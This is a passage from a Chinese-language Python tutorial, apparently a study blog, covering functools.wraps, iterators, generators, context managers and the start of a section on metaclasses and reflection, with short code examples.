title="functools.wraps：保留原函数的元数据"></a><code>functools.wraps</code>：保留原函数的元数据</h2><p>当我们使用装饰器时，原函数的一些元数据（如函数名、文档字符串等）会丢失。如果我们希望装饰器能够保留原函数的这些元数据，可以使用<code>functools.wraps</code>。</p><h3 id="示例：使用functools-wraps"><a href="#示例：使用functools-wraps" class="headerlink" title="示例：使用functools.wraps"></a>示例：使用<code>functools.wraps</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_decorator</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Before function call&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@simple_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;This is a greeting function.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(say_hello.__name__)  <span class="comment"># 输出：say_hello</span></span><br><span class="line"><span class="built_in">print</span>(say_hello.__doc__)   <span class="comment"># 输出：This is a greeting function.</span></span><br></pre></td></tr></table></figure><p>在这个例子中，使用了<code>@wraps(func)</code>来确保装饰器不会丢失原函数的<code>__name__</code>和<code>__doc__</code>等元数据。否则，装饰器会导致<code>say_hello</code>函数的元数据丢失。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>装饰器</strong>是一个接受函数作为输入并返回一个新函数的高阶函数，用于扩展函数或方法的功能。</li><li><strong>基本语法</strong>：使用<code>@decorator</code>语法来装饰函数，装饰器本质上是一个包装函数。</li><li><strong>带参数的装饰器</strong>：可以通过嵌套函数来创建带参数的装饰器。</li><li><strong>多个装饰器</strong>：可以使用多个装饰器来装饰一个函数，装饰器按从下到上的顺序执行。</li><li><code>**functools.wraps**</code>：确保装饰器能够保留原函数的元数据（如<code>__name__</code>和<code>__doc__</code>等）。</li></ul><p>装饰器为Python提供了一个强大的工具，可以在不修改函数内部代码的情况下，灵活地增加或修改其行为。</p><hr><h1 id="生成器和迭代器"><a href="#生成器和迭代器" class="headerlink" title="生成器和迭代器"></a>生成器和迭代器</h1><h2 id="生成器与迭代器"><a href="#生成器与迭代器" class="headerlink" title="生成器与迭代器"></a>生成器与迭代器</h2><p>在Python中，生成器（Generator）和迭代器（Iterator）是用于实现迭代操作的两种重要工具。它们都用于遍历一个集合或序列中的元素，但它们的工作方式和实现原理有所不同。理解生成器和迭代器的区别和使用场景对编写高效的Python代码非常重要。</p><h2 id="迭代器（Iterator）"><a href="#迭代器（Iterator）" class="headerlink" title="迭代器（Iterator）"></a>迭代器（Iterator）</h2><h3 id="迭代器的定义"><a href="#迭代器的定义" class="headerlink" title="迭代器的定义"></a>迭代器的定义</h3><p>迭代器是一个对象，它实现了<code>__iter__()</code>和<code>__next__()</code>方法。这使得该对象可以被迭代，从而依次返回集合中的元素。</p><ul><li><code>__iter__()</code>：返回一个迭代器对象，通常返回<code>self</code>。</li><li><code>__next__()</code>：返回集合中的下一个元素。如果没有更多元素，抛出<code>StopIteration</code>异常。</li></ul><h3 id="创建迭代器"><a href="#创建迭代器" class="headerlink" title="创建迭代器"></a>创建迭代器</h3><p>Python中的<code>list</code>、<code>tuple</code>、<code>dict</code>等容器类型本身就已经是可迭代的，也就是说，它们是默认的迭代器。我们可以使用<code>iter()</code>函数将这些容器类型转化为迭代器，并使用<code>next()</code>函数进行遍历。</p><h4 id="示例：使用迭代器遍历列表"><a href="#示例：使用迭代器遍历列表" class="headerlink" title="示例：使用迭代器遍历列表"></a>示例：使用迭代器遍历列表</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">iterator = <span class="built_in">iter</span>(numbers)  <span class="comment"># 创建迭代器</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(iterator))  <span class="comment"># 输出：1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(iterator))  <span class="comment"># 输出：2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(iterator))  <span class="comment"># 输出：3</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>iter(numbers)</code>创建了一个列表的迭代器，<code>next(iterator)</code>用于获取列表中的下一个元素。迭代器通过不断调用<code>next()</code>方法来遍历集合中的元素。</p><h4 id="自定义迭代器"><a href="#自定义迭代器" class="headerlink" title="自定义迭代器"></a>自定义迭代器</h4><p>我们也可以通过自定义类来实现迭代器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Counter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, low, high</span>):</span><br><span class="line">        <span class="variable language_">self</span>.current = low</span><br><span class="line">        <span class="variable language_">self</span>.high = high</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.current &gt; <span class="variable language_">self</span>.high:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.current += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.current - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个从0到4的计数器</span></span><br><span class="line">counter = Counter(<span class="number">0</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> counter:</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure><p>在这个例子中，我们自定义了一个<code>Counter</code>类，使其可以作为迭代器使用。<code>__next__()</code>方法返回当前计数，并在超出<code>high</code>值时抛出<code>StopIteration</code>异常。</p><h3 id="迭代器的优点"><a href="#迭代器的优点" class="headerlink" title="迭代器的优点"></a>迭代器的优点</h3><ul><li><strong>节省内存</strong>：迭代器通常不会一次性加载所有数据，而是逐个生成数据项。因此，它非常适用于大数据集的遍历。</li><li><strong>无限序列</strong>：迭代器可以生成无限序列，只要没有达到停止条件，迭代器就会继续生成数据。</li></ul><h2 id="生成器（Generator）"><a href="#生成器（Generator）" class="headerlink" title="生成器（Generator）"></a>生成器（Generator）</h2><h3 id="生成器的定义"><a href="#生成器的定义" class="headerlink" title="生成器的定义"></a>生成器的定义</h3><p>生成器是使用<code>yield</code>语句的函数。生成器函数与普通函数的区别在于，当执行到<code>yield</code>语句时，函数的执行会暂停，并将当前值返回给调用者。下次调用时，生成器函数从上次暂停的地方继续执行。生成器函数不返回一个值，而是返回一个生成器对象，它实现了迭代器协议，具备 <code>__iter__()</code> 和 <code>__next__()</code> 方法。  </p><h3 id="创建生成器"><a href="#创建生成器" class="headerlink" title="创建生成器"></a>创建生成器</h3><p>生成器是通过函数中使用<code>yield</code>关键字来创建的。每次调用生成器的<code>__next__()</code>方法时，函数会从上次停止的地方继续执行。</p><h4 id="示例：使用yield创建生成器"><a href="#示例：使用yield创建生成器" class="headerlink" title="示例：使用yield创建生成器"></a>示例：使用<code>yield</code>创建生成器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">countdown</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">yield</span> n  <span class="comment"># 暂停并返回当前值</span></span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">gen = countdown(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出：5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出：4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出：3</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>countdown()</code>是一个生成器函数，它从<code>n</code>开始倒计时，每次通过<code>yield</code>返回当前的<code>n</code>值。每次调用<code>next()</code>时，生成器从上次暂停的地方继续执行。</p><h3 id="生成器的特点"><a href="#生成器的特点" class="headerlink" title="生成器的特点"></a>生成器的特点</h3><ul><li><strong>延迟计算</strong>：生成器并不在创建时就生成所有的值，而是每次调用<code>next()</code>时生成一个新值。它仅在需要时才生成下一个值，适合处理大数据集。</li><li><strong>内存效率</strong>：由于生成器不会一次性将所有数据加载到内存中，它们非常节省内存。适用于大规模数据处理。</li></ul><h3 id="生成器与迭代器的关系"><a href="#生成器与迭代器的关系" class="headerlink" title="生成器与迭代器的关系"></a>生成器与迭代器的关系</h3><p>生成器是实现迭代器的一种特殊方式，实际上，生成器就是一种迭代器。它使用<code>yield</code>生成数据，并通过<code>__next__()</code>方法进行遍历。与手动实现的迭代器相比，生成器更简洁、灵活。</p><h2 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h2><p>除了使用生成器函数，Python还允许通过生成器表达式来创建生成器。这类似于列表推导式，但它返回的是一个生成器，而不是一个列表。</p><h3 id="示例：使用生成器表达式"><a href="#示例：使用生成器表达式" class="headerlink" title="示例：使用生成器表达式"></a>示例：使用生成器表达式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gen = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出：0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出：1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))  <span class="comment"># 输出：4</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>(x * x for x in range(5))</code>是一个生成器表达式，它生成了0到4的平方值。与列表推导式不同，生成器表达式不会立即生成所有的值，而是每次请求一个新值时才计算。</p><h3 id="生成器表达式的优点"><a href="#生成器表达式的优点" class="headerlink" title="生成器表达式的优点"></a>生成器表达式的优点</h3><ul><li><strong>简洁</strong>：生成器表达式提供了一种简洁的方式来创建生成器。</li><li><strong>节省内存</strong>：它不会一次性计算并存储所有的值，而是每次请求一个值时才计算。</li></ul><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><ul><li>迭代器是实现了<code>__iter__()</code>和<code>__next__()</code>方法的对象。</li><li>可以通过<code>iter()</code>和<code>next()</code>函数来使用。</li><li>适用于需要逐步获取数据的场景，节省内存。</li></ul><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><ul><li>生成器是使用<code>yield</code>的函数。</li><li>生成器通过暂停和恢复的机制，按需生成数据。</li><li>适用于需要延迟计算和节省内存的场景。</li></ul><h3 id="生成器与迭代器的关系-1"><a href="#生成器与迭代器的关系-1" class="headerlink" title="生成器与迭代器的关系"></a>生成器与迭代器的关系</h3><ul><li>生成器是迭代器的一种特殊实现，生成器函数通过<code>yield</code>返回一个可迭代的对象。</li><li>与普通迭代器相比，生成器通常更加简洁且内存效率更高。</li></ul><hr><h1 id="上下文管理器"><a href="#上下文管理器" class="headerlink" title="上下文管理器"></a>上下文管理器</h1><h2 id="上下文管理器（Context-Managers）"><a href="#上下文管理器（Context-Managers）" class="headerlink" title="上下文管理器（Context Managers）"></a>上下文管理器（Context Managers）</h2><p>上下文管理器是Python中用于管理资源（如文件、网络连接、数据库连接等）的一种机制。它允许开发者在某个代码块执行之前和之后自动执行特定的操作，如打开资源、释放资源等。上下文管理器通过<code>with</code>语句来使用，它确保在使用完资源后进行必要的清理工作，不论代码块中是否发生异常。</p><p>上下文管理器在处理资源时非常有用，尤其在确保资源得到释放时（如文件关闭、数据库连接关闭、锁释放等）。通过使用上下文管理器，我们可以避免写重复的清理代码，并使代码更加简洁和安全。</p><h2 id="with语句的基本语法"><a href="#with语句的基本语法" class="headerlink" title="with语句的基本语法"></a><code>with</code>语句的基本语法</h2><p>上下文管理器的核心是<code>with</code>语句，<code>with</code>语句会自动管理代码块的前后资源，确保资源的正确使用与释放。它的基本语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> context_manager <span class="keyword">as</span> variable:</span><br><span class="line">    <span class="comment"># 执行的代码块</span></span><br></pre></td></tr></table></figure><ul><li><code>context_manager</code>是实现了上下文管理协议的对象。</li><li><code>variable</code>是上下文管理器提供的资源，可以在代码块中使用。</li></ul><h2 id="使用内建的上下文管理器"><a href="#使用内建的上下文管理器" class="headerlink" title="使用内建的上下文管理器"></a>使用内建的上下文管理器</h2><p>Python提供了一些内建的上下文管理器，最常见的就是用于处理文件操作的<code>open()</code>函数，它可以自动管理文件的打开和关闭。</p><h3 id="示例：使用with管理文件操作"><a href="#示例：使用with管理文件操作" class="headerlink" title="示例：使用with管理文件操作"></a>示例：使用<code>with</code>管理文件操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sample.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>open(&quot;sample.txt&quot;, &quot;r&quot;)</code>返回一个上下文管理器对象。<code>with</code>语句确保文件在使用完毕后被正确关闭。即使在<code>read()</code>操作过程中抛出异常，文件也会被正确关闭。</p><h3 id="with语句的工作原理"><a href="#with语句的工作原理" class="headerlink" title="with语句的工作原理"></a><code>with</code>语句的工作原理</h3><p>当<code>with</code>语句执行时，Python会执行上下文管理器的<code>__enter__()</code>方法，然后进入代码块。代码块执行完毕后，无论是否发生异常，都会执行上下文管理器的<code>__exit__()</code>方法来进行清理工作。</p><h2 id="自定义上下文管理器"><a href="#自定义上下文管理器" class="headerlink" title="自定义上下文管理器"></a>自定义上下文管理器</h2><p>Python允许我们自定义上下文管理器。要创建一个上下文管理器，我们需要实现<code>__enter__()</code>和<code>__exit__()</code>方法。<code>__enter__()</code>方法用于进入上下文管理器的代码块，<code>__exit__()</code>方法用于退出代码块时进行清理工作。</p><h3 id="示例：自定义上下文管理器"><a href="#示例：自定义上下文管理器" class="headerlink" title="示例：自定义上下文管理器"></a>示例：自定义上下文管理器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContextManager</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Entering the context&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>  <span class="comment"># 可以返回任意对象，通常返回`self`</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, traceback</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Exiting the context&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> exc_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;An exception occurred: <span class="subst">&#123;exc_value&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 如果返回`True`，则不会再抛出异常；如果返回`False`或`None`，异常将继续传播</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> MyContextManager() <span class="keyword">as</span> cm:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Inside the context&quot;</span>)</span><br><span class="line">    <span class="comment"># 可以模拟异常来测试异常处理</span></span><br><span class="line">    <span class="comment"># raise ValueError(&quot;An error occurred!&quot;)</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>MyContextManager</code>类实现了上下文管理器所需的<code>__enter__</code>和<code>__exit__</code>方法：</p><ul><li><code>__enter__()</code>方法在<code>with</code>语句执行前调用。它通常用于获取资源，并返回一个值供<code>as</code>后面的变量使用。</li><li><code>__exit__()</code>方法在<code>with</code>语句执行完毕后调用。它用于处理资源清理。如果在<code>with</code>块内抛出异常，<code>__exit__()</code>方法会捕获到异常信息，并可以选择是否抛出异常。</li></ul><h3 id="输出：-5"><a href="#输出：-5" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Entering the context</span><br><span class="line">Inside the context</span><br><span class="line">Exiting the context</span><br></pre></td></tr></table></figure><p>如果你取消注释代码中抛出异常的部分：</p><h3 id="输出（带异常）："><a href="#输出（带异常）：" class="headerlink" title="输出（带异常）："></a>输出（带异常）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Entering the context</span><br><span class="line">Inside the context</span><br><span class="line">Exiting the context</span><br><span class="line">An exception occurred: An error occurred!</span><br></pre></td></tr></table></figure><h3 id="enter-与-exit-的细节"><a href="#enter-与-exit-的细节" class="headerlink" title="__enter__()与__exit__()的细节"></a><code>__enter__()</code>与<code>__exit__()</code>的细节</h3><ul><li><code>**__enter__()**</code>：<ul><li><code>__enter__()</code>方法在代码块执行之前调用，通常用于初始化资源。</li><li>它的返回值可以传递给<code>with</code>语句中的<code>as</code>变量。</li></ul></li><li><code>**__exit__()**</code>：<ul><li><code>__exit__()</code>方法在代码块执行结束时调用，无论代码块是否正常结束。如果代码块内有异常抛出，<code>__exit__()</code>会捕获到异常类型、异常值和回溯信息。</li><li>如果<code>__exit__()</code>返回<code>True</code>，异常将被抑制，不会传播；如果返回<code>False</code>或<code>None</code>，异常将继续传播。</li></ul></li></ul><h2 id="上下文管理器的常见应用"><a href="#上下文管理器的常见应用" class="headerlink" title="上下文管理器的常见应用"></a>上下文管理器的常见应用</h2><h3 id="1-文件操作"><a href="#1-文件操作" class="headerlink" title="1. 文件操作"></a>1. <strong>文件操作</strong></h3><p>文件的打开和关闭是最常见的上下文管理器应用。<code>with</code>语句确保文件在使用完毕后自动关闭，避免遗漏关闭文件的问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><h3 id="2-数据库连接"><a href="#2-数据库连接" class="headerlink" title="2. 数据库连接"></a>2. <strong>数据库连接</strong></h3><p>数据库连接也常常需要使用上下文管理器来保证连接在使用完毕后能够自动关闭。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseConnection</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.connection = sqlite3.connect(<span class="string">&quot;example.db&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.connection</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, traceback</span>):</span><br><span class="line">        <span class="variable language_">self</span>.connection.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Database connection closed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> DatabaseConnection() <span class="keyword">as</span> conn:</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT * FROM users&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(cursor.fetchall())</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>DatabaseConnection</code>类是一个自定义的上下文管理器，它确保数据库连接在<code>with</code>语句结束后关闭。</p><h3 id="3-锁"><a href="#3-锁" class="headerlink" title="3. 锁"></a>3. <strong>锁</strong></h3><p>在并发编程中，锁常常用来保证线程安全。Python的<code>threading</code>模块提供了<code>Lock</code>类，它本身就是一个上下文管理器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">    <span class="comment"># 执行需要线程安全的操作</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Critical section&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过<code>with</code>语句，可以确保锁在<code>with</code>块执行完毕后自动释放，即使发生异常。</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><ul><li><strong>上下文管理器</strong>是用于管理资源的一种工具，它可以确保资源在使用完毕后被正确地释放。</li><li>上下文管理器通过实现<code>__enter__()</code>和<code>__exit__()</code>方法来定义资源的获取和清理。</li><li><code>with</code>语句是Python中使用上下文管理器的主要语法，它可以确保资源的正确管理，避免资源泄露。</li><li>上下文管理器的应用场景包括文件操作、数据库连接、锁等。</li></ul><p>通过使用上下文管理器，Python代码更加简洁、清晰，同时能够有效地管理资源，避免忘记清理资源的问题。</p><hr><h1 id="元编程与反射"><a href="#元编程与反射" class="headerlink" title="元编程与反射"></a>元编程与反射</h1><p>这块内容有些抽象, 不知道具体应用, 以后遇到再说吧~</p><h2 id="元编程简介"><a href="#元编程简介" class="headerlink" title="元编程简介"></a>元编程简介</h2><p><strong>元编程</strong>是指编写能够操作、修改、生成或执行其他代码的代码。在Python中，元编程通过动态地创建或修改类、函数、方法等，提供了非常强大的灵活性。元编程的一些常见应用包括动态生成代码、修改类行为、实现插件架构等。</p><p>Python中最常见的元编程技术是通过 **元类（Metaclasses）**来实现的。</p><h3 id="什么是元类？"><a href="#什么是元类？" class="headerlink" title="什么是元类？"></a>什么是元类？</h3><p>在Python中，<strong>元类</strong>是定义类的类。所有的类都是由元类创建的，而默认情况下，Python的所有类都是由<code>type</code>元类创建的。<strong>普通类</strong>是用来创建<strong>实例对象</strong>的模板。类定义了对象的属性和方法，当我们创建一个类的实例时，就会根据这个类来创建实际的对象。<strong>元类</strong>是用来创建<strong>类</strong>的类。换句话说，元类控制类的创建过程，而普通类控制实例的创建过程。元类定义了类如何被构建，它可以在类的创建过程中修改类的定义，比如自动为类添加方法、修改属性、强制类遵循某些规则等. 简单来说，元类决定了类的创建方式，它可以控制类的创建过程，并允许开发者修改类的定义。</p><h4 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上述定义的类实际上是由 type 元类创建的</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(MyClass))  <span class="comment"># 输出：&lt;class &#x27;type&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>MyClass</code>类是由<code>type</code>元类创建的。每个类都是<code>type</code>类的实例，因此类本身也是对象。</p><h3 id="创建自定义元类"><a href="#创建自定义元类" class="headerlink" title="创建自定义元类"></a>创建自定义元类</h3><p>通过自定义元类，可以在类创建时修改类的属性和方法。这为高级功能提供了更大的灵活性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义元类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, name, bases, dct</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Creating class <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls, name, bases, dct) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义元类创建类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>(metaclass=MyMeta):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>MyMeta</code>是一个自定义的元类，它通过<code>__new__()</code>方法打印出类的创建信息。在创建<code>MyClass</code>类时，<code>MyMeta</code>元类会被调用。</p><h3 id="元类的应用场景"><a href="#元类的应用场景" class="headerlink" title="元类的应用场景"></a>元类的应用场景</h3><ul><li><strong>动态生成类</strong>：根据需求动态生成类。通过元类，可以在程序运行时创建类。</li><li><strong>修改类的行为</strong>：可以修改类的方法和属性，甚至为类添加新功能。</li><li><strong>实现单例模式</strong>：元类可以确保类只有一个实例，这就是单例模式的实现。</li></ul><h2 id="反射简介"><a href="#反射简介" class="headerlink" title="反射简介"></a>反射简介</h2><p><strong>反射</strong>是指程序在运行时动态地获取对象的属性、方法，甚至修改它们。通过反射，程序可以访问对象的内部结构，动态地修改对象的状态，甚至调用对象的方法。</p><p>在Python中，反射是通过一些内建函数实现的，例如：<code>getattr()</code>、<code>setattr()</code>、<code>hasattr()</code>等。</p><h3 id="使用-getattr-、setattr-、hasattr-进行反射"><a href="#使用-getattr-、setattr-、hasattr-进行反射" class="headerlink" title="使用 getattr()、setattr()、hasattr() 进行反射"></a>使用 <code>getattr()</code>、<code>setattr()</code>、<code>hasattr()</code> 进行反射</h3><ul><li><code>getattr()</code>：获取对象的属性值。</li><li><code>setattr()</code>：设置对象的属性值。</li><li><code>hasattr()</code>：检查对象是否有某个属性。</li></ul><h4 id="示例：使用-getattr-、setattr-和-hasattr"><a 